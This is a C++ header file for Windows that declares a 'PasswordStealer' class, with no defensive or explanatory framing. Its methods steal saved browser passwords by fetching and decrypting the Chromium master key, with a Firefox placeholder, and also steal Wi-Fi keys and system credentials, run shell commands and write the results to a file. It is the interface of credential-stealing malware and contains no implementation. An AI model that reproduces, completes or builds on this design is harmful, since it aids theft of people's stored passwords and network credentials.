#ifndef PASSWORD_STEALER_H
#define PASSWORD_STEALER_H

#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include <cstdint>

struct BrowserCredentials {
    std::string browser_name;
    std::string url;
    std::string username;
    std::string password;
    std::string date_created;
};

struct WiFiCredential {
    std::string ssid;
    std::string password;
    std::string security_type;
};

class PasswordStealer {
public:
    PasswordStealer();
    ~PasswordStealer();

    // Main stealers
    std::vector<BrowserCredentials> StealBrowserPasswords();
    std::vector<WiFiCredential>     StealWiFiPasswords();
    std::map<std::string, std::string> StealSystemCredentials();

    // Output
    bool SaveToFile(const std::string& filename);
    std::string GetFormattedOutput();

private:
    std::vector<BrowserCredentials> browser_creds;
    std::vector<WiFiCredential>     wifi_creds;
    std::map<std::string, std::string> system_creds;
    mutable CRITICAL_SECTION cs;

    // Chromium-family helpers
    std::vector<BrowserCredentials> StealChromiumPasswords(
        const std::string& browser_name,
        const std::string& user_data_dir,
        const std::string& local_state_path);
    std::string GetChromiumMasterKey(const std::string& local_state_path);
    std::string DecryptChromiumPassword(const std::vector<uint8_t>& encrypted,
                                        const std::string& master_key_b64);

    // Firefox placeholder
    std::vector<BrowserCredentials> StealFirefoxPasswords();

    // WiFi + creds
    std::string ExecuteCommand(const std::string& cmd);
    std::wstring GetUserProfilePath();
    bool FileExists(const std::string& path);
    std::string ReadFileContent(const std::string& path);
};

#endif